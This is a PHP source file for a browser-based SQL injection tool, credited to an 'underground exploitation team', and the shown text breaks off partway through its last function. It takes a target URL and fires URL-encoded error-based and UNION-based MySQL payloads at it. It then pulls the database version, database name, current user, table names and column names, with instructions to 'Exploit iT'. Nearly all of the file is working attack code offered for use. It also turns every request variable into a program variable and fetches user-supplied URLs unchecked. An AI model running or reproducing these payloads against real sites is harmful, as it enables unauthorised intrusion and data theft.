<?php
echo "<title>Dis9-SQL Injection ToolKit v0.1</title>";
/*****************************************************************

1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=1
3                                                                      3
3     ________   .__          ________                                 3
7     \______ \  |__|  ______/   __   \     ____    ____    _____      7
1      |    |  \ |  | /  ___/\____    /   _/ ___\  /  _ \  /     \     1
3      |    `   \|  | \___ \    /    /    \  \___ (  <_> )|  Y Y  \    3
3     /_______  /|__|/____  >  /____/   /\ \___  > \____/ |__|_|  /    3
7             \/          \/            \/     \/               \/     7
1                                                                      1
3              >> The Underground Exploitation Team <<                 3
3-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=3

[+] Author : KedAns-Dz < ked-h [ at ] hotmail.com | 1337day.com | dis9.com >
[+] Home : [ www.1337day.com]  * [ www.dis9.com ]
[+] Facebook : [ http://facebook.com/KedAns ]
[+] Cr3w : [ Dis9 Underground Exploitation Team ]
[+] Greets to : Dz Offenders Cr3W <*> Algerian Cyber Army <*> Inj3ct0r Team

******************************************************************/

$a = array(
'%27%20AND%20%28SELECT%208041%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x3a6f79753a%2C%28SELECT%20%28CASE%20WHEN%20%288041%3D8041%29%20THEN%201%20ELSE%200%20END%29%29%2C0x3a70687a3a%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%27MEpR%27%3D%27MEpR',
'%27%29%20AND%20%28SELECT%208041%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x3a6f79753a%2C%28SELECT%20%28CASE%20WHEN%20%288041%3D8041%29%20THEN%201%20ELSE%200%20END%29%29%2C0x3a70687a3a%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%28%27ffAM%27%3D%27ffAM',
'%20AND%20%28SELECT%208041%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x3a6f79753a%2C%28SELECT%20%28CASE%20WHEN%20%288041%3D8041%29%20THEN%201%20ELSE%200%20END%29%29%2C0x3a70687a3a%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29',
'%29%20AND%20%28SELECT%208041%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x3a6f79753a%2C%28SELECT%20%28CASE%20WHEN%20%288041%3D8041%29%20THEN%201%20ELSE%200%20END%29%29%2C0x3a70687a3a%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%287609%3D7609'
);
$b = array(
//UNION queries:
'%20-6863%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20CONCAT%280x3a6f79753a%2C0x4244764877697569706b%2C0x3a70687a3a%29%2C%20NULL%2C%20NULL%2C%20NULL%23', //10 cols
'%20-6863%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20CONCAT%280x3a6f79753a%2C0x4244764877697569706b%2C0x3a70687a3a%29%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%23', //8 cols
'%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20CONCAT%280x3a6f79753a%2C0x4244764877697569706b%2C0x3a70687a3a%29%2C%20NULL%23', //8cols v2
'%20-6863%20UNION%20ALL%20SELECT%20NULL%2C%20CONCAT%280x3a6f79753a%2C0x4244764877697569706b%2C0x3a70687a3a%29%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%23',//6 cols
);



//globals
$string= 'You have an error in your SQL syntax';
$string2= 'supplied argument is not a valid MySQL';
$string3= ':oyu:';
$string4= 'dummy request';
@$url2 = "$url\")'";
$html = @file_get_contents("$url2");
$pos = strpos($html, $string);
	

//--------------------------------------------------------------------------------------------------------------


    foreach ($_GET as $key => $val) $$key=htmldecode($val);
    foreach ($_POST as $key => $val) $$key=htmldecode($val);
    foreach ($_COOKIE as $key => $val) $$key=htmldecode($val);

   
	
switch (@$frame){
        case 1: frame1(); break;
        case 2: frame2(); break;
        case 3: frame3(); break;
		case 4: frame4(); break;
		case 5: frame5(); break;
        default:
            switch(@$action){
                default: frameset();
  
			}
		}

function htmldecode($str){
    if (is_string($str)){
       if (get_magic_quotes_gpc()) return stripslashes(html_entity_decode($str));
       else return html_entity_decode($str);
    } else return $str;
}
function html_header($plus=""){

echo "
<html>
<head>
<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\">

$plus
 <style>
    body {
        font-family : Arial;

        font-weight : normal;
        color: green;
        background-color: black;
    }
	</style>
</head>

";
}

//------------------------------------------------------------------------------------------------------------------

//Functions for queries and stuffs

if(@$mode_eb == 1){
@$version = "$url+%27%20AND%20%28SELECT%206722%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x3a6f79753a%2C%28MID%28%28IFNULL%28CAST%28VERSION%28%29%20AS%20CHAR%29%2C0x20%29%29%2C1%2C50%29%29%2C0x3a70687a3a%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%27MEpR%27%3D%27MEpR";
@$database = "$url+%27%20AND%20%28SELECT%206870%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x3a6f79753a%2C%28MID%28%28IFNULL%28CAST%28DATABASE%28%29%20AS%20CHAR%29%2C0x20%29%29%2C1%2C50%29%29%2C0x3a70687a3a%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%27MEpR%27%3D%27MEpR";
@$usuario = "$url+%27%20AND%20%28SELECT%202525%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x3a6f79753a%2C%28MID%28%28IFNULL%28CAST%28CURRENT_USER%28%29%20AS%20CHAR%29%2C0x20%29%29%2C1%2C50%29%29%2C0x3a70687a3a%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%27MEpR%27%3D%27MEpR";


}elseif(@$mode_eb == 2){
@$version = "$url+%27%29%20AND%20%28SELECT%206722%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x3a6f79753a%2C%28MID%28%28IFNULL%28CAST%28VERSION%28%29%20AS%20CHAR%29%2C0x20%29%29%2C1%2C50%29%29%2C0x3a70687a3a%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%28%27ffAM%27%3D%27ffAM";
@$database = "$url+%27%29%20AND%20%28SELECT%206870%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x3a6f79753a%2C%28MID%28%28IFNULL%28CAST%28DATABASE%28%29%20AS%20CHAR%29%2C0x20%29%29%2C1%2C50%29%29%2C0x3a70687a3a%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%28%27ffAM%27%3D%27ffAM";
@$usuario = "$url+%27%29%20AND%20%28SELECT%202525%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x3a6f79753a%2C%28MID%28%28IFNULL%28CAST%28CURRENT_USER%28%29%20AS%20CHAR%29%2C0x20%29%29%2C1%2C50%29%29%2C0x3a70687a3a%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%28%27ffAM%27%3D%27ffAM";


}elseif(@$mode_eb == 3){
@$version = "$url+%20AND%20%28SELECT%206722%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x3a6f79753a%2C%28MID%28%28IFNULL%28CAST%28VERSION%28%29%20AS%20CHAR%29%2C0x20%29%29%2C1%2C50%29%29%2C0x3a70687a3a%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29";
@$database = "$url+%20AND%20%28SELECT%206870%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x3a6f79753a%2C%28MID%28%28IFNULL%28CAST%28DATABASE%28%29%20AS%20CHAR%29%2C0x20%29%29%2C1%2C50%29%29%2C0x3a70687a3a%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29";
@$usuario = "$url+%20AND%20%28SELECT%202525%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x3a6f79753a%2C%28MID%28%28IFNULL%28CAST%28CURRENT_USER%28%29%20AS%20CHAR%29%2C0x20%29%29%2C1%2C50%29%29%2C0x3a70687a3a%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29";


}elseif(@$mode_eb == 4){
@$version = "$url+%29%20AND%20%28SELECT%206722%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x3a6f79753a%2C%28MID%28%28IFNULL%28CAST%28VERSION%28%29%20AS%20CHAR%29%2C0x20%29%29%2C1%2C50%29%29%2C0x3a70687a3a%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%287609%3D7609";
@$database = "$url+%29%20AND%20%28SELECT%206870%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x3a6f79753a%2C%28MID%28%28IFNULL%28CAST%28DATABASE%28%29%20AS%20CHAR%29%2C0x20%29%29%2C1%2C50%29%29%2C0x3a70687a3a%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%287609%3D7609";
@$usuario = "$url+%29%20AND%20%28SELECT%202525%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x3a6f79753a%2C%28MID%28%28IFNULL%28CAST%28CURRENT_USER%28%29%20AS%20CHAR%29%2C0x20%29%29%2C1%2C50%29%29%2C0x3a70687a3a%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%287609%3D7609";



}

	@$versio = @file_get_contents("$version");
	@$databas = @file_get_contents("$database");
	@$usuari = @file_get_contents("$usuario");








function hexEncode($str){
    if(is_null($str)){
    return FALSE;
   }
    $hexStr = "";
     for($i=0;isset($str[$i]);$i++){
       $char = dechex(ord($str[$i]));
       $hexStr .= $char;
     }
      return "0x".$hexStr;
     }
function asciiEncode($str){
      if(!preg_match("/^0x[A-Fa-f0-9]+/",$str)){
       return FALSE;   //Not a hex string
      }
       $str = substr($str,2);
     $asciiString = "";
      for($i=0;isset($str[$i]);$i+=2){
       $hexChar = substr($str,$i,2);
        $asciiString .= chr(hexdec($hexChar));
      }
   return $asciiString;
  }
function GetBetween($content){
    $r = explode(":oyu:", $content);
    if (isset($r[1])){
        $r = explode(":phz:", $r[1]);
        return $r[0];
  }
  return '';
}

function mode_comaprison_eb($detectar_t){

if($detectar_t == @$detectar)
{return "vulnerable";}
}
function mode_comaprison_uq($detectar_t){
//UNION query:
if($detectar_t == @$detectar2)
{return "vulnerable";}//10 cols
}



function frameset(){
	
    html_header();
		
    echo "
    <frameset rows=\"*,25%\" framespacing=\"0\" frameborder=\"0\">
			<frame src=\"".$_SERVER['PHP_SELF']."?frame=1\" name=frame1 border=\"0\" marginwidth=\"0\" marginheight=\"0\">
	    <frameset cols=\"33%,*,33%\" framespacing=\"0\" frameborder=\"0\">
            <frame src=\"".$_SERVER['PHP_SELF']."?frame=2\" name=frame2 border=\"0\" marginwidth=\"0\" marginheight=\"0\">
        <frame src=\"".$_SERVER['PHP_SELF']."?frame=3\" name=frame3 border=\"0\" marginwidth=\"0\" marginheight=\"0\">
			<frame src=\"".$_SERVER['PHP_SELF']."?frame=4\" name=frame4 border=\"0\" marginwidth=\"0\" marginheight=\"0\">
        </frameset>
		<!--	<frame src=\"".$_SERVER['PHP_SELF']."?frame=5\" name=frame5 border=\"0\" marginwidth=\"0\" marginheight=\"0\">!-->
       </frameset>
    ";
    echo "</html>";
}
function frame1(){
			global $string2, $string, $string3, $pos, $url2, $html, $mode_eb, $a, $b;
			 global $action, $detectar_t;
	html_header();
	 echo "<body>\n";

	

echo " 
<center>
<table border=0 width=700 align=center><tr><Td><center><p style='font-size: 18pt;'>
<b>Dis9-SQL Inj3ction ToolKit v0.1 | KedAns-Dz</br></b></td></tr>
</center>

</table>
[!] Usage: <br>
[+] Paste URL (example: http://site.com/test.php?id=1)<br>
[+] Press \"seach\" button.<br>
[+] Exploit iT !<br><br>
<table>
<tr><td>

<center>
<form action=\" ".$_SERVER['PHP_SELF']."?frame=1\" method=\"post\" name=\"forma\" id=\"forma\">
url: <input type=\"text\" name=\"url\" id=\"url\" size=\"65\"/>
<input type=\"submit\" name=\"forma\" id=\"form\" value=\"search\"/>
</form>
</center>
";

if(isset($_POST['forma']) && $_POST['forma']=='search')
{

	$url = $_POST["url"];
	echo "Testing: $url<br><br>";

		$as=1;
		foreach($a as $detectar){

		$url3 = "$url+$detectar";
		@$html2 = file_get_contents("$url3");

		if(strpos($html2, @$string3)==true)
		{
			if(mode_comaprison_eb($detectar) == "vulnerable"){

			}
		$mode_eb = $as;
		
		echo "<font color=blue>Detected: ERROR BASED inyection =)</font> <br>QUERY: <font size=2 color=red>$detectar</font><br><br>";
		@$eb_i = 1;
		
		}
		$as++;
		
		}
		if (@$eb_i ==1){
				echo "
				<center>
	<form action=\"".$_SERVER['PHP_SELF']."?frame=2\" method=\"post\" target=\"frame2\" name=\"tablas\" id=\"tablas\">
	<input type=\"hidden\" name=\"url\" id=\"url\" value=\"$url\"/>
	<input type=\"hidden\" name=\"lol\" id=\"lol\" value=\"$mode_eb\"/>
	<input type=\"submit\" name=\"tablas\" id=\"tablas\" value=\"GET Exploit\"/>
	
	</form> 
	</center>
	";}

		foreach($b as $detectar2){
		$url6 = "$url+$detectar2";
		@$html8 = file_get_contents("$url6");	
		
		if(strpos(@$html8, @$string3)==true){
			if(mode_comaprison_uq($detectar2) == "vulnerable"){
				}
			
		echo "<center><font color=blue>Detected: UNION query inyection =)</font> <br>QUERY: <font size=2 color=red>$detectar2</font><br><br></center>";
		$uq_i = 1;
		}		
		
		}
		if((@$eb_i == 0) && (@$uq_i==0))
		{
		echo "<center><br><font color=red>No injection point founded =(</font><br><br></center>";
		}


}
     echo "</body>\n</html>";	

}
function frame2(){
	html_header();
global $string2, $string, $string3, $pos, $url2, $html;
global $action, $detectar_t;

if(isset($_POST['tablas']) && $_POST['tablas']=='GET Exploit')
{
	

	$url = $_POST["url"];
	$mode_eb = $_POST["lol"];
	
if ($mode_eb==1){ 
	@$tablas2 = "$url+%27%20AND%20%28SELECT%203830%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x3a6f79753a%2C%28SELECT%20MID%28%28IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%29%2C1%2C50%29%20FROM%20INFORMATION_SCHEMA.TABLES%20WHERE%20table_schema%20%3D%20DATABASE()%20%29%2C0x3a70687a3a%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%27MEpR%27%3D%27MEpR";
	}
elseif ($mode_eb==2){ 
	@$tablas2 = "$url+%27%29%20AND%20%28SELECT%203830%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x3a6f79753a%2C%28SELECT%20MID%28%28IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%29%2C1%2C50%29%20FROM%20INFORMATION_SCHEMA.TABLES%20WHERE%20table_schema%20%3D%20DATABASE()%20%29%2C0x3a70687a3a%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%28%27ffAM%27%3D%27ffAM";
	}
elseif ($mode_eb==3){ 
	@$tablas2 = "$url+%20AND%20%28SELECT%203830%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x3a6f79753a%2C%28SELECT%20MID%28%28IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%29%2C1%2C50%29%20FROM%20INFORMATION_SCHEMA.TABLES%20WHERE%20table_schema%20%3D%20DATABASE()%20%29%2C0x3a70687a3a%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29";
	}
elseif ($mode_eb==4){ 
	@$tablas2 = "$url+%29%20AND%20%28SELECT%203830%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x3a6f79753a%2C%28SELECT%20MID%28%28IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%29%2C1%2C50%29%20FROM%20INFORMATION_SCHEMA.TABLES%20WHERE%20table_schema%20%3D%20DATABASE()%20%29%2C0x3a70687a3a%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%287609%3D7609";
	}
$tabla = @file_get_contents("$tablas2");	


	$i = -1;   
	  
	 
echo "
	<form action=\"".$_SERVER['PHP_SELF']."?frame=3\" target=\"frame3\" method=\"post\" name=\"columnas\" id=\"columnas\">
	<input type=\"hidden\" name=\"url\" id=\"url\" value=\"$url\"/>
	<select name=\"num\" id=\"num\>";
	while ($i <= (GetBetween($tabla)-1)):
	
		if($mode_eb == 1){
		@$_tablas = "%27%20AND%20%28SELECT%207288%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x3a6f79753a%2C%28SELECT%20MID%28%28IFNULL%28CAST%28table_name%20AS%20CHAR%29%2C0x20%29%29%2C1%2C50%29%20FROM%20INFORMATION_SCHEMA.TABLES%20WHERE%20table_schema%20%3D%20DATABASE()%20LIMIT%20$i%2C1%29%2C0x3a70687a3a%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%27MEpR%27%3D%27MEpR";
}elseif($mode_eb == 2){
		@$_tablas = "%27%29%20AND%20%28SELECT%207288%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x3a6f79753a%2C%28SELECT%20MID%28%28IFNULL%28CAST%28table_name%20AS%20CHAR%29%2C0x20%29%29%2C1%2C50%29%20FROM%20INFORMATION_SCHEMA.TABLES%20WHERE%20table_schema%20%3D%20DATABASE()%20LIMIT%20$i%2C1%29%2C0x3a70687a3a%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%28%27ffAM%27%3D%27ffAM";
}elseif($mode_eb == 3){
		@$_tablas = "%20AND%20%28SELECT%207288%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x3a6f79753a%2C%28SELECT%20MID%28%28IFNULL%28CAST%28table_name%20AS%20CHAR%29%2C0x20%29%29%2C1%2C50%29%20FROM%20INFORMATION_SCHEMA.TABLES%20WHERE%20table_schema%20%3D%20DATABASE()%20LIMIT%20$i%2C1%29%2C0x3a70687a3a%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29";
}elseif($mode_eb == 4){
		@$_tablas = "%29%20AND%20%28SELECT%207288%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x3a6f79753a%2C%28SELECT%20MID%28%28IFNULL%28CAST%28table_name%20AS%20CHAR%29%2C0x20%29%29%2C1%2C50%29%20FROM%20INFORMATION_SCHEMA.TABLES%20WHERE%20table_schema%20%3D%20DATABASE()%20LIMIT%20$i%2C1%29%2C0x3a70687a3a%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%287609%3D7609";
}
	$nums_tablas = "$url+$_tablas";
	
	echo $nums_tablas;
	$n_tabla = file_get_contents("$nums_tablas");
	
	$num = GetBetween($n_tabla);
	echo "<option value=\"".hexEncode($num)."\">$num</option>";
    $i++;
	endwhile;

	echo "</select>";
	echo"<input type=\"hidden\" name=\"lol\" id=\"lol\" value=\"$mode_eb\"/>";
	echo "	<input type=\"submit\" name=\"columnas\" id=\"columnas\" value=\"columns\"/>";
	echo "<form>";

}
//STILL PLAYING WITH UNION QUERIES


	}
function frame3(){
html_header();
global $string2, $string, $string3, $pos, $url2, $html;
global $action, $detectar_t;


if(isset($_POST['columnas']) && $_POST['columnas']=='columns')
{
	$url = $_POST["url"];
	$table_n = $_POST["num"];
	$mode_eb = $_POST["lol"];
	
		if($mode_eb == 1){
@$columna = "$url+%27%20AND%20%28SELECT%201906%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x3a6f79753a%2C%28SELECT%20MID%28%28IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%29%2C1%2C50%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D$table_n%20AND%20table_schema%3DDATABASE()%29%2C0x3a70687a3a%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%27MEpR%27%3D%27MEpR";		
}elseif($mode_eb == 2){
@$columna = "$url+%27%29%20AND%20%28SELECT%201906%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x3a6f79753a%2C%28SELECT%20MID%28%28IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%29%2C1%2C50%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D$table_n%20AND%20table_schema%3DDATABASE()%29%2C0x3a70687a3a%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%28%27ffAM%27%3D%27ffAM";
}elseif($mode_eb == 3){
@$columna = "$url+%20AND%20%28SELECT%201906%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x3a6f79753a%2C%28SELECT%20MID%28%28IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%29%2C1%2C50%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D$table_n%20AND%20table_schema%3DDATABASE()%29%2C0x3a70687a3a%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29";
}elseif($mode_eb == 4){
		@$columna = "$url+%29%20AND%20%28SELECT%201906%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x3a6f79753a%2C%28SELECT%20MID%28%28IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%29%2C1%2C50%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D$table_n%20AND%20table_schema%3DDATABASE()%29%2C0x3a70687a3a%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%287609%3D7609";
}
	



	
	@$column = @file_get_contents("$columna");
	
	
	

echo "
	<form action=\"".$_SERVER['PHP_SELF']."?frame=4\" target=\"frame4\" method=\"post\" name=\"datas\" id=\"datas\">
	<input type=\"hidden\" name=\"url\" id=\"url\" value=\"$url\"/>
	<input type=\"hidden\" name=\"dz\" id=\"dz\" value=\"".asciiEncode($table_n)."\"/>";
	$i = 0;
	
	echo"<select name=\"num2\" id=\"num2\">";
	while ($i <= GetBetween($column)-1):
		if($mode_eb == 1){
			@$_column = "%27%20AND%20%28SELECT%205724%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x3a6f79753a%2C%28SELECT%20MID%28%28IFNULL%28CAST%28column_name%20AS%20CHAR%29%2C0x20%29%29%2C1%2C50%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D$table_n%20AND%20table_schema%3DDATABASE()%20LIMIT%20$i%2C1%29%2C0x3a70687a3a%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%27MEpR%27%3D%27MEpR";
	}elseif($mode_eb == 2){
			@$_column = "%27%29%20AND%20%28SELECT%205724%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x3a6f79753a%2C%28SELECT%20MID%28%28IFNULL%28CAST%28column_name%20AS%20CHAR%29%2C0x20%29%29%2C1%2C50%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D$table_n%20AND%20table_schema%3DDATABASE()%20LIMIT%20$i%2C1%29%2C0x3a70687a3a%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%28%27ffAM%27%3D%27ffAM";
	}elseif($mode_eb == 3){
			@$_column = "%20AND%20%28SELECT%205724%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x3a6f79753a%2C%28SELECT%20MID%28%28IFNULL%28CAST%28column_name%20AS%20CHAR%29%2C0x20%29%29%2C1%2C50%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D$table_n%20AND%20table_schema%3DDATABASE()%20LIMIT%20$i%2C1%29%2C0x3a70687a3a%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29";
	}elseif($mode_eb == 4){
			@$_column = "%29%20AND%20%28SELECT%205724%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x3a6f79753a%2C%28SELECT%20MID%28%28IFNULL%28CAST%28column_name%20AS%20CHAR%29%2C0x20%29%29%2C1%2C50%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D$table_n%20AND%20table_schema%3DDATABASE()%20LIMIT%20$i%2C1%29%2C0x3a70687a3a%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%287609%3D7609";
	}
	
	
	
	
	
	$nums_columna = "$url+$_column";
	$n_tcolum = file_get_contents("$nums_columna");
	$num2 = GetBetween($n_tcolum);
	echo "<option value=\"$num2\">$num2</option>";
    $i++;
	endwhile;
	echo "</select>";
	echo"<input type=\"hidden\" name=\"lol\" id=\"lol\" value=\"$mode_eb\"/>";
	echo "<input type=\"submit\" name=\"datas\" id=\"datas\" value=\"data\"/>";
	echo "<form>";

	
}

	}
function frame4(){
	html_header();
	
if(isset($_POST['datas']) && $_POST['datas']=='data')
{
	$url = $_POST["url"];
	$num3 = $_POST["num2"];
	$dz = $_POST["dz"];
	
	$mode_eb = $_POST["lol"];

if($mode_eb==1){
 @$datas = "$url+%27%20AND%20%28SELECT%207656%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x3a6f79753a%2C%28SELECT%20MID%28%28IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%29%2C1%2C50%29%20FROM%20".GetBetween($databas,$start1,$end2).".$dz%29%2C0x3a70687a3a%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%27MEpR%27%3D%27MEpR";
}elseif($mode_eb==2){
 @$datas = "$url+%27%29%20AND%20%28SELECT%207656%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x3a6f79753a%2C%28SELECT%20MID%28%28IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%29%2C1%2C50%29%20FROM%20".GetBetween($databas,$start1,$end2).".$dz%29%2C0x3a70687a3a%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%28%27ffAM%27%3D%27ffAM";
}elseif($mode_eb==3){
